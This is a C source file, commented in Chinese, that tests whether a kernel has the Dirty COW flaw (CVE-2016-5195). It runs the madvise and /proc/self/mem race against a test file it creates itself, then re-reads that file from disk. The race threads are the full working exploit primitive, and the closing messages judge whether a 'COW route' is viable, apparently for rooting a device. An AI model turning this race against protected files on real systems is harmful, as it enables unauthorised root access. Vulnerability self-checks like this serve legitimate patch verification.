/* cowtest —— Dirty COW (CVE-2016-5195) 存在性自检
 *
 * 零风险：全程只碰自己可写的私有目录里的一个测试文件，不改任何系统文件。
 *
 * 原理
 * ----
 * 用 O_RDONLY 打开文件，再 mmap(PROT_READ, MAP_PRIVATE) 映射它。
 * 按 POSIX 语义，这种映射**无论怎么折腾都不可能改动磁盘上的内容**。
 *
 * 如果 COW 洞存在（3.10.65 的 __get_user_pages 里 `foll_flags &= ~FOLL_WRITE`
 * 让内核给只读私有映射做了可写 fault），往 /proc/self/mem 里写会直接落到
 * page cache 的物理页上，于是磁盘内容真的被改了。
 *
 * 判据（唯一可信）
 * ----------------
 *   攻击结束后 **另开一个 fd，用 open() + read() 重新读**。
 *   读到改后的内容 ⇒ 有洞。
 *
 *   只看到 write() 返回成功 = 假阳性，不算数。
 *   只看到自己 mmap 视图变了 = 正常的私有 COW 行为，也不算数。
 *
 * 用法
 * ----
 *     cowtest [测试文件路径]
 *
 *   Android app 里跑要传自己私有目录下的路径（app 只能写
 *   /data/data/<pkg>/files 这类地方），例如：
 *     cowtest /data/data/<你的包名>/files/cow_probe.dat
 *   默认 /data/local/tmp/cow_probe.dat。
 *
 * 返回值：0 = 有洞（可利用），2 = 无洞（已修补），其它 = 运行错误。
 *
 * 编译：
 *   arm-linux-gnueabihf-gcc -static -O2 -pthread -o cowtest src/cowtest.c
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define PAGESZ 4096
#define DEFAULT_PATH "/data/local/tmp/cow_probe.dat"

static char *g_map;
static size_t g_len;
static volatile int g_stop;
static volatile long g_tries;

/* 线程 1：不停 madvise(MADV_DONTNEED)，把 PTE 打掉，制造 fault 窗口 */
static void *madvise_thread(void *arg)
{
    (void)arg;
    while (!g_stop) {
        madvise(g_map, g_len, MADV_DONTNEED);
        __sync_fetch_and_add(&g_tries, 1);
    }
    return NULL;
}

/* 线程 2：往自己的 /proc/self/mem 写，骗内核走 COW 路径 */
static void *write_thread(void *arg)
{
    const char *payload = (const char *)arg;
    long n = 0;
    int memfd;

    memfd = open("/proc/self/mem", O_RDWR);
    if (memfd < 0) {
        perror("open /proc/self/mem");
        return NULL;
    }
    /* 映射的地址就是本进程 /proc/self/mem 里的偏移 */
    while (!g_stop) {
        if (lseek(memfd, (off_t)(uintptr_t)g_map, SEEK_SET) < 0)
            continue;
        if (write(memfd, payload, 8) == 8)
            n++;
    }
    close(memfd);
    printf("    write_thread: %ld 次 write() 返回成功（注意：这不代表写进了磁盘）\n", n);
    return NULL;
}

int main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1] : DEFAULT_PATH;
    char buf[64];
    char orig[] = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD";   /* 32 字节 */
    struct stat st;
    ssize_t n;
    pthread_t t1, t2;
    int fd, rfd, i;

    printf("=== Dirty COW 自检 (CVE-2016-5195) ===\n");
    printf("uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
    printf("测试文件: %s\n", path);
    printf("（零风险：只改这个我们自己建的测试文件）\n\n");

    /* ---- 1. 准备测试文件 ---- */
    unlink(path);
    fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0600);
    if (fd < 0) {
        perror("创建测试文件");
        fprintf(stderr, "提示：换个你自己可写的路径，见文件头 usage\n");
        return 1;
    }
    if (write(fd, orig, strlen(orig)) != (ssize_t)strlen(orig)) {
        perror("写测试文件");
        close(fd);
        return 1;
    }
    close(fd);

    /* ---- 2. 只读打开（关键：O_RDONLY）---- */
    fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("只读打开");
        return 1;
    }
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        return 1;
    }
    g_len = (size_t)((st.st_size + PAGESZ - 1) & ~(off_t)(PAGESZ - 1));
    if (g_len < PAGESZ)
        g_len = PAGESZ;

    /* ---- 3. 私有只读映射（关键：PROT_READ + MAP_PRIVATE）---- */
    g_map = mmap(NULL, g_len, PROT_READ, MAP_PRIVATE, fd, 0);
    if (g_map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("  只读映射 ok @ %p (len %zu)\n", g_map, g_len);
    printf("  原始内容: %.32s\n", g_map);

    /* ---- 4. 双线程竞态跑 3 秒 ---- */
    g_stop = 0;
    g_tries = 0;
    pthread_create(&t1, NULL, madvise_thread, NULL);
    pthread_create(&t2, NULL, write_thread, (void *)"ZZZZZZZZ");

    for (i = 0; i < 30; i++)
        usleep(100000);

    g_stop = 1;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    printf("  madvise 循环: %ld 次\n", g_tries);

    /* ---- 5. 判定：独立 open + read ----
     * 这一步是唯一可信的判据。mmap 视图变没变、write 返没返成功都不算。 */
    memset(buf, 0, sizeof(buf));
    rfd = open(path, O_RDONLY);
    if (rfd < 0) {
        perror("复读打开");
        return 1;
    }
    n = read(rfd, buf, sizeof(buf) - 1);
    close(rfd);
    if (n < 0)
        n = 0;
    buf[n] = 0;

    printf("\n  ── 判定 ──\n");
    printf("  重新读回: %.32s\n", buf);

    if (strstr(buf, "ZZZZZZZZ") != NULL) {
        printf("\n  ★ 有洞：只读私有映射竟改了磁盘内容 ★\n");
        printf("  ⇒ CVE-2016-5195 存在，COW 路线可行\n");
        unlink(path);
        return 0;
    }

    if (memcmp(buf, orig, strlen(orig)) != 0) {
        printf("\n  ? 内容变了但不是我们写的 pattern，可能是文件被别的东西动过\n");
        unlink(path);
        return 3;
    }

    /* 再看 mmap 视图：变了但磁盘没变 = 正常的私有 COW 行为 */
    if (strstr(g_map, "ZZZZZZZZ") != NULL)
        printf("  mmap 视图已变但磁盘没变 ⇒ 正常 COW 语义，洞已修补\n");
    else
        printf("  什么都没变\n");

    printf("\n  ✗ 无洞：CVE-2016-5195 已被修复\n");
    printf("  ⇒ COW 路线不可行\n");
    unlink(path);
    return 2;
}
